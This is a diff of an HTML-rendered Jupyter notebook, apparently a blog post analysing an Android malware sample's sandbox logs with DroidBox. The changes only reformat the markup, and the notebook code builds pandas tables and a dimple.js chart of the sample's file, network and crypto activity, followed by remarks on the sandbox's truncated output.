-<div class="input_area box-flex1" style="display:none">
-<div class="highlight-ipynb"><pre class="ipynb"><span class="c"># Convert timestamps to human readable time delta</span>
-<span class="n">timestamps</span> <span class="o">=</span> <span class="p">[</span><span class="nb">str</span><span class="p">(</span><span class="n">datetime</span><span class="o">.</span><span class="n">timedelta</span><span class="p">(</span><span class="n">seconds</span><span class="o">=</span><span class="p">(</span><span class="nb">round</span><span class="p">(</span><span class="nb">float</span><span class="p">(</span><span class="n">i</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">"utf-8"</span><span class="p">))))))</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">result</span><span class="p">[</span><span class="s">'cryptousage'</span><span class="p">]</span><span class="o">.</span><span class="n">keys</span><span class="p">()]</span>
+<div class="prompt input_prompt">In [417]:</div>
+<div class="collapseheader inner_cell"><span style="font-weight: bold;">Expand Code</span>
+<div class="input_area" style="display:none">
+<div class="highlight-ipynb"><pre class="ipynb"><span></span><span class="c1"># Convert timestamps to human readable time delta</span>
+<span class="n">timestamps</span> <span class="o">=</span> <span class="p">[</span><span class="nb">str</span><span class="p">(</span><span class="n">datetime</span><span class="o">.</span><span class="n">timedelta</span><span class="p">(</span><span class="n">seconds</span><span class="o">=</span><span class="p">(</span><span class="nb">round</span><span class="p">(</span><span class="nb">float</span><span class="p">(</span><span class="n">i</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">"utf-8"</span><span class="p">))))))</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">result</span><span class="p">[</span><span class="s1">'cryptousage'</span><span class="p">]</span><span class="o">.</span><span class="n">keys</span><span class="p">()]</span>
 
-<span class="c"># Create list of accessed files entries</span>
-<span class="n">crypto_usage</span> <span class="o">=</span> <span class="p">[</span><span class="n">i</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">result</span><span class="p">[</span><span class="s">'cryptousage'</span><span class="p">]</span><span class="o">.</span><span class="n">items</span><span class="p">()]</span>
+<span class="c1"># Create list of accessed files entries</span>
+<span class="n">crypto_usage</span> <span class="o">=</span> <span class="p">[</span><span class="n">i</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">result</span><span class="p">[</span><span class="s1">'cryptousage'</span><span class="p">]</span><span class="o">.</span><span class="n">items</span><span class="p">()]</span>
 
-<span class="c"># Create dataframe</span>
+<span class="c1"># Create dataframe</span>
 <span class="n">df_cryptousage</span> <span class="o">=</span> <span class="n">pd</span><span class="o">.</span><span class="n">DataFrame</span><span class="p">(</span><span class="n">crypto_usage</span><span class="p">,</span> <span class="n">index</span><span class="o">=</span><span class="n">timestamps</span><span class="p">)</span>
 <span class="n">df_cryptousage</span><span class="o">.</span><span class="n">sort</span><span class="p">(</span><span class="n">inplace</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
-<span class="n">df_cryptousage</span><span class="o">.</span><span class="n">index</span><span class="o">.</span><span class="n">name</span><span class="o">=</span><span class="s">'Timestamp'</span>
+<span class="n">df_cryptousage</span><span class="o">.</span><span class="n">index</span><span class="o">.</span><span class="n">name</span><span class="o">=</span><span class="s1">'Timestamp'</span>
 
-<span class="c"># Unhexlify data</span>
-<span class="c">#unhexed_data = [binascii.unhexlify(d) for d in df_recvnet['data']]</span>
-<span class="c">#df_recvnet['rawdata'] = unhexed_data</span>
+<span class="c1"># Unhexlify data</span>
+<span class="c1">#unhexed_data = [binascii.unhexlify(d) for d in df_recvnet['data']]</span>
+<span class="c1">#df_recvnet['rawdata'] = unhexed_data</span>
 
-<span class="c">#df_recvnet[['host', 'port', 'type', 'rawdata']]</span>
+<span class="c1">#df_recvnet[['host', 'port', 'type', 'rawdata']]</span>
 <span class="n">df_cryptousage</span><span class="o">.</span><span class="n">reset_index</span><span class="p">()</span>
 </pre></div>
 </div>
@@ -1742,9 +1719,8 @@ In [417]:
 </div>
 <div class="output_wrapper">
 <div class="output">
-<div class="output_area"><div class="prompt output_prompt">
-    Out[417]:</div>
-<div class="output_html rendered_html output_subarea output_pyout">
+<div class="output_area"><div class="prompt output_prompt">Out[417]:</div>
+<div class="output_html rendered_html output_subarea output_execute_result">
 <div style="max-height:1000px;max-width:1500px;overflow:auto;">
 <table border="1" class="table table-hover table-striped dataframe">
 <thead>
@@ -1818,45 +1794,43 @@ In [417]:
 </div>
 <div class="cell border-box-sizing code_cell rendered">
 <div class="input">
-<div class="prompt input_prompt">
-In [418]:
-</div>
-<div class="collapseheader box-flex1"><span style="font-weight: bold;">Expand Code</span>
-<div class="input_area box-flex1" style="display:none">
-<div class="highlight-ipynb"><pre class="ipynb"><span class="c"># Create df</span>
-<span class="n">df_activities</span> <span class="o">=</span> <span class="n">pd</span><span class="o">.</span><span class="n">DataFrame</span><span class="p">(</span><span class="n">columns</span><span class="o">=</span><span class="p">[[</span><span class="s">'Timestamp'</span><span class="p">,</span> <span class="s">'Operation'</span><span class="p">,</span> <span class="s">'Category'</span><span class="p">]])</span>
+<div class="prompt input_prompt">In [418]:</div>
+<div class="collapseheader inner_cell"><span style="font-weight: bold;">Expand Code</span>
+<div class="input_area" style="display:none">
+<div class="highlight-ipynb"><pre class="ipynb"><span></span><span class="c1"># Create df</span>
+<span class="n">df_activities</span> <span class="o">=</span> <span class="n">pd</span><span class="o">.</span><span class="n">DataFrame</span><span class="p">(</span><span class="n">columns</span><span class="o">=</span><span class="p">[[</span><span class="s1">'Timestamp'</span><span class="p">,</span> <span class="s1">'Operation'</span><span class="p">,</span> <span class="s1">'Category'</span><span class="p">]])</span>
 
-<span class="c"># file system access</span>
+<span class="c1"># file system access</span>
 <span class="n">accessed_files</span> <span class="o">=</span> <span class="n">df_accessedfiles</span><span class="o">.</span><span class="n">reset_index</span><span class="p">()[[</span><span class="mi">0</span><span class="p">,</span><span class="mi">3</span><span class="p">]]</span>
-<span class="n">accessed_files</span><span class="p">[</span><span class="s">'Category'</span><span class="p">]</span> <span class="o">=</span> <span class="s">"file system"</span>
-<span class="n">accessed_files</span><span class="o">.</span><span class="n">columns</span> <span class="o">=</span> <span class="p">[</span><span class="s">'Timestamp'</span><span class="p">,</span> <span class="s">'Operation'</span><span class="p">,</span> <span class="s">'Category'</span><span class="p">]</span>
+<span class="n">accessed_files</span><span class="p">[</span><span class="s1">'Category'</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"file system"</span>
+<span class="n">accessed_files</span><span class="o">.</span><span class="n">columns</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'Timestamp'</span><span class="p">,</span> <span class="s1">'Operation'</span><span class="p">,</span> <span class="s1">'Category'</span><span class="p">]</span>
 
-<span class="c"># network activities</span>
+<span class="c1"># network activities</span>
 <span class="n">network_open</span> <span class="o">=</span> <span class="n">df_opennet</span><span class="o">.</span><span class="n">reset_index</span><span class="p">()[[</span><span class="mi">0</span><span class="p">]]</span>
-<span class="n">network_open</span><span class="p">[</span><span class="s">'Operation'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'net open'</span>
-<span class="n">network_open</span><span class="p">[</span><span class="s">'Category'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'network'</span>
-<span class="n">network_open</span><span class="o">.</span><span class="n">columns</span> <span class="o">=</span> <span class="p">[</span><span class="s">'Timestamp'</span><span class="p">,</span> <span class="s">'Operation'</span><span class="p">,</span> <span class="s">'Category'</span><span class="p">]</span>
+<span class="n">network_open</span><span class="p">[</span><span class="s1">'Operation'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'net open'</span>
+<span class="n">network_open</span><span class="p">[</span><span class="s1">'Category'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'network'</span>
+<span class="n">network_open</span><span class="o">.</span><span class="n">columns</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'Timestamp'</span><span class="p">,</span> <span class="s1">'Operation'</span><span class="p">,</span> <span class="s1">'Category'</span><span class="p">]</span>
 
 <span class="n">network_sent</span> <span class="o">=</span> <span class="n">df_sendnet</span><span class="o">.</span><span class="n">reset_index</span><span class="p">()[[</span><span class="mi">0</span><span class="p">,</span><span class="mi">6</span><span class="p">]]</span>
-<span class="n">network_sent</span><span class="p">[</span><span class="s">'Category'</span><span class="p">]</span> <span class="o">=</span> <span class="s">"network"</span>
-<span class="n">network_sent</span><span class="o">.</span><span class="n">columns</span> <span class="o">=</span> <span class="p">[</span><span class="s">'Timestamp'</span><span class="p">,</span> <span class="s">'Operation'</span><span class="p">,</span> <span class="s">'Category'</span><span class="p">]</span>
+<span class="n">network_sent</span><span class="p">[</span><span class="s1">'Category'</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"network"</span>
+<span class="n">network_sent</span><span class="o">.</span><span class="n">columns</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'Timestamp'</span><span class="p">,</span> <span class="s1">'Operation'</span><span class="p">,</span> <span class="s1">'Category'</span><span class="p">]</span>
 
 <span class="n">network_recv</span> <span class="o">=</span> <span class="n">df_recvnet</span><span class="o">.</span><span class="n">reset_index</span><span class="p">()[[</span><span class="mi">0</span><span class="p">,</span><span class="mi">4</span><span class="p">]]</span>
-<span class="n">network_recv</span><span class="p">[</span><span class="s">'Category'</span><span class="p">]</span> <span class="o">=</span> <span class="s">"network"</span>
-<span class="n">network_recv</span><span class="o">.</span><span class="n">columns</span> <span class="o">=</span> <span class="p">[</span><span class="s">'Timestamp'</span><span class="p">,</span> <span class="s">'Operation'</span><span class="p">,</span> <span class="s">'Category'</span><span class="p">]</span>
+<span class="n">network_recv</span><span class="p">[</span><span class="s1">'Category'</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"network"</span>
+<span class="n">network_recv</span><span class="o">.</span><span class="n">columns</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'Timestamp'</span><span class="p">,</span> <span class="s1">'Operation'</span><span class="p">,</span> <span class="s1">'Category'</span><span class="p">]</span>
 
-<span class="c"># crpyto usage</span>
+<span class="c1"># crpyto usage</span>
 <span class="n">crypto_usage</span> <span class="o">=</span> <span class="n">df_cryptousage</span><span class="o">.</span><span class="n">reset_index</span><span class="p">()[[</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">]]</span>
-<span class="n">crypto_usage</span><span class="p">[</span><span class="s">'Category'</span><span class="p">]</span> <span class="o">=</span> <span class="s">"crypto"</span>
-<span class="n">crypto_usage</span><span class="o">.</span><span class="n">columns</span> <span class="o">=</span> <span class="p">[</span><span class="s">'Timestamp'</span><span class="p">,</span> <span class="s">'Operation'</span><span class="p">,</span> <span class="s">'Category'</span><span class="p">]</span>
+<span class="n">crypto_usage</span><span class="p">[</span><span class="s1">'Category'</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"crypto"</span>
+<span class="n">crypto_usage</span><span class="o">.</span><span class="n">columns</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'Timestamp'</span><span class="p">,</span> <span class="s1">'Operation'</span><span class="p">,</span> <span class="s1">'Category'</span><span class="p">]</span>
 
-<span class="c"># Merge data frames</span>
+<span class="c1"># Merge data frames</span>
 <span class="n">df_activities</span> <span class="o">=</span> <span class="n">pd</span><span class="o">.</span><span class="n">concat</span><span class="p">([</span><span class="n">accessed_files</span><span class="p">,</span> <span class="n">network_open</span><span class="p">,</span> <span class="n">network_sent</span><span class="p">,</span> <span class="n">network_recv</span><span class="p">,</span> <span class="n">crypto_usage</span><span class="p">],</span> <span class="n">ignore_index</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
-<span class="n">df_activities</span><span class="o">.</span><span class="n">sort</span><span class="p">(</span><span class="s">'Timestamp'</span><span class="p">,</span> <span class="n">inplace</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+<span class="n">df_activities</span><span class="o">.</span><span class="n">sort</span><span class="p">(</span><span class="s1">'Timestamp'</span><span class="p">,</span> <span class="n">inplace</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
 
-<span class="c"># Convert to JSON</span>
-<span class="n">d</span> <span class="o">=</span> <span class="n">df_activities</span><span class="o">.</span><span class="n">to_json</span><span class="p">(</span><span class="n">orient</span><span class="o">=</span><span class="s">'records'</span><span class="p">)</span>
-<span class="n">json_data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">d</span><span class="p">),</span> <span class="n">ensure_ascii</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">"utf-8"</span><span class="p">)</span>
+<span class="c1"># Convert to JSON</span>
+<span class="n">d</span> <span class="o">=</span> <span class="n">df_activities</span><span class="o">.</span><span class="n">to_json</span><span class="p">(</span><span class="n">orient</span><span class="o">=</span><span class="s1">'records'</span><span class="p">)</span>
+<span class="n">json_data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">d</span><span class="p">),</span> <span class="n">ensure_ascii</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">"utf-8"</span><span class="p">)</span>
 
 <span class="n">df_activities</span>
 </pre></div>
@@ -1865,9 +1839,8 @@ In [418]:
 </div>
 <div class="output_wrapper">
 <div class="output">
-<div class="output_area"><div class="prompt output_prompt">
-    Out[418]:</div>
-<div class="output_html rendered_html output_subarea output_pyout">
+<div class="output_area"><div class="prompt output_prompt">Out[418]:</div>
+<div class="output_html rendered_html output_subarea output_execute_result">
 <div style="max-height:1000px;max-width:1500px;overflow:auto;">
 <table border="1" class="table table-hover table-striped dataframe">
 <thead>
@@ -2138,49 +2111,46 @@ In [418]:
 </div>
 <div class="inner_cell">
 <div class="text_cell_render border-box-sizing rendered_html">
-<p>A fancier overview ... </p>
+<p>A fancier overview ...</p>
 </div>
 </div>
 </div>
 <div class="cell border-box-sizing code_cell rendered">
 <div class="input">
-<div class="prompt input_prompt">
-In [419]:
-</div>
-<div class="collapseheader box-flex1"><span style="font-weight: bold;">Expand Code</span>
-<div class="input_area box-flex1" style="display:none">
-<div class="highlight-ipynb"><pre class="ipynb"><span class="o">%%</span><span class="k">jinja</span> <span class="n">html</span>
-<span class="o">&lt;</span><span class="err">!</span><span class="o">--</span> <span class="n">collapse</span><span class="o">=</span><span class="bp">True</span> <span class="o">--&gt;</span>
-<span class="o">&lt;</span><span class="n">html</span><span class="o">&gt;</span>
-<span class="o">&lt;</span><span class="n">head</span><span class="o">&gt;</span>
-  <span class="o">&lt;</span><span class="n">script</span> <span class="n">src</span><span class="o">=</span><span class="s">"http://d3js.org/d3.v3.min.js"</span><span class="o">&gt;&lt;/</span><span class="n">script</span><span class="o">&gt;</span>
-  <span class="o">&lt;</span><span class="n">script</span> <span class="n">src</span><span class="o">=</span><span class="s">"http://dimplejs.org/dist/dimple.v2.1.0.min.js"</span><span class="o">&gt;&lt;/</span><span class="n">script</span><span class="o">&gt;</span>
-<span class="o">&lt;</span><span class="n">title</span><span class="o">&gt;</span><span class="p">{{</span> <span class="n">title</span> <span class="p">}}</span><span class="o">&lt;/</span><span class="n">title</span><span class="o">&gt;</span>
-<span class="o">&lt;/</span><span class="n">head</span><span class="o">&gt;</span>
-<span class="o">&lt;</span><span class="n">body</span><span class="o">&gt;</span>
-<span class="o">&lt;</span><span class="n">div</span> <span class="nb">id</span><span class="o">=</span><span class="s">"bar_chart"</span><span class="o">&gt;&lt;/</span><span class="n">div</span><span class="o">&gt;</span>
-  <span class="o">&lt;</span><span class="n">script</span> <span class="nb">type</span><span class="o">=</span><span class="s">"text/javascript"</span><span class="o">&gt;</span>
-    <span class="n">var</span> <span class="n">json_data</span>  <span class="o">=</span> <span class="p">{{</span> <span class="n">json_data</span> <span class="p">}};</span>
-    <span class="n">var</span> <span class="n">svg</span> <span class="o">=</span> <span class="n">dimple</span><span class="o">.</span><span class="n">newSvg</span><span class="p">(</span><span class="s">"#bar_chart"</span><span class="p">,</span> <span class="mi">800</span><span class="p">,</span> <span class="mi">800</span><span class="p">);</span>
-    <span class="n">var</span> <span class="n">myChart</span> <span class="o">=</span> <span class="n">new</span> <span class="n">dimple</span><span class="o">.</span><span class="n">chart</span><span class="p">(</span><span class="n">svg</span><span class="p">,</span> <span class="n">json_data</span><span class="p">);</span>
-    <span class="n">myChart</span><span class="o">.</span><span class="n">setBounds</span><span class="p">(</span><span class="mi">150</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">700</span><span class="p">,</span> <span class="mi">680</span><span class="p">)</span>
-    <span class="n">myChart</span><span class="o">.</span><span class="n">addCategoryAxis</span><span class="p">(</span><span class="s">"x"</span><span class="p">,</span> <span class="p">[</span><span class="s">"Category"</span><span class="p">,</span> <span class="s">"Operation"</span><span class="p">]);</span>
-    <span class="n">myChart</span><span class="o">.</span><span class="n">addCategoryAxis</span><span class="p">(</span><span class="s">"y"</span><span class="p">,</span> <span class="s">"Timestamp"</span><span class="p">);</span>
-    <span class="n">myChart</span><span class="o">.</span><span class="n">addSeries</span><span class="p">(</span><span class="s">"Operation"</span><span class="p">,</span> <span class="n">dimple</span><span class="o">.</span><span class="n">plot</span><span class="o">.</span><span class="n">bar</span><span class="p">);</span>
-    <span class="n">myChart</span><span class="o">.</span><span class="n">addLegend</span><span class="p">(</span><span class="mi">170</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">630</span><span class="p">,</span> <span class="mi">20</span><span class="p">,</span> <span class="s">"right"</span><span class="p">);</span>
-    <span class="n">myChart</span><span class="o">.</span><span class="n">draw</span><span class="p">();</span>
-  <span class="o">&lt;/</span><span class="n">script</span><span class="o">&gt;</span>
-<span class="o">&lt;/</span><span class="n">body</span><span class="o">&gt;</span>
-<span class="o">&lt;/</span><span class="n">html</span><span class="o">&gt;</span>
+<div class="prompt input_prompt">In [419]:</div>
+<div class="inner_cell">
+<div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="o">%%</span><span class="k">jinja</span> html
+&lt;!-- collapse=True --&gt;
+&lt;html&gt;
+&lt;head&gt;
+  &lt;script src="http://d3js.org/d3.v3.min.js"&gt;&lt;/script&gt;
+  &lt;script src="http://dimplejs.org/dist/dimple.v2.1.0.min.js"&gt;&lt;/script&gt;
+&lt;title&gt;{{ title }}&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div id="bar_chart"&gt;&lt;/div&gt;
+  &lt;script type="text/javascript"&gt;
+    var json_data  = {{ json_data }};
+    var svg = dimple.newSvg("#bar_chart", 800, 800);
+    var myChart = new dimple.chart(svg, json_data);
+    myChart.setBounds(150, 50, 700, 680)
+    myChart.addCategoryAxis("x", ["Category", "Operation"]);
+    myChart.addCategoryAxis("y", "Timestamp");
+    myChart.addSeries("Operation", dimple.plot.bar);
+    myChart.addLegend(170, 10, 630, 20, "right");
+    myChart.draw();
+  &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
 </pre></div>
 </div>
 </div>
 </div>
 <div class="output_wrapper">
 <div class="output">
-<div class="output_area"><div class="prompt output_prompt">
-    Out[419]:</div>
-<div class="output_html rendered_html output_subarea output_pyout">
+<div class="output_area"><div class="prompt output_prompt">Out[419]:</div>
+<div class="output_html rendered_html output_subarea output_execute_result">
 <!-- collapse=True -->
 <html>
 <head>
@@ -2236,10 +2206,10 @@ In [419]:
 <div class="inner_cell">
 <div class="text_cell_render border-box-sizing rendered_html">
 <p>I think <code>DroidBox</code> is a very good tool to deal with Android APKs and analyze their behaviour during run-time. It comes with a working mobile sandbox meant to inspect and monitor an applications activities. However during my analysis I had to rely on previous analysis since the results didn't contain the full details. Not only the network traffic but also the contents read from files weren't complete. In order to fully unterstand one malware I need complete details about its behaviour.  For example I had following response from the server which is completely useless:</p>
-<pre><code>HTTP/1.1 406 Not Acceptable\r\nDate: Mon, 28 Jul 2014 13:29:38 GMT\r\nServer: Apache\r\nContent-...
-</code></pre><p>Besides that I was indeed able to see that the application is reading from some file. But the delivered content was once again striped:</p>
-<pre><code>&lt;?xml version='1.0' encoding='utf-8' standalone='yes' ?&gt;\n&lt;map&gt;\n&lt;string name="DOWNLOADDOMAIN"&gt;c...
-</code></pre><p>I hope the developers will see this as a vital necessity and update as soon as possible. Furthermore I'll look forward to other mobile sandboxes which have data instrumentation capabilities. Next time I'll have a deeper look at Androids <a href="http://developer.android.com/tools/debugging/ddms.html">DDMS</a>.</p>
+<pre><code>HTTP/1.1 406 Not Acceptable\r\nDate: Mon, 28 Jul 2014 13:29:38 GMT\r\nServer: Apache\r\nContent-...</code></pre>
+<p>Besides that I was indeed able to see that the application is reading from some file. But the delivered content was once again striped:</p>
+<pre><code>&lt;?xml version='1.0' encoding='utf-8' standalone='yes' ?&gt;\n&lt;map&gt;\n&lt;string name="DOWNLOADDOMAIN"&gt;c...</code></pre>
+<p>I hope the developers will see this as a vital necessity and update as soon as possible. Furthermore I'll look forward to other mobile sandboxes which have data instrumentation capabilities. Next time I'll have a deeper look at Androids <a href="http://developer.android.com/tools/debugging/ddms.html">DDMS</a>.</p>
 </div>
 </div>
 </div></p>
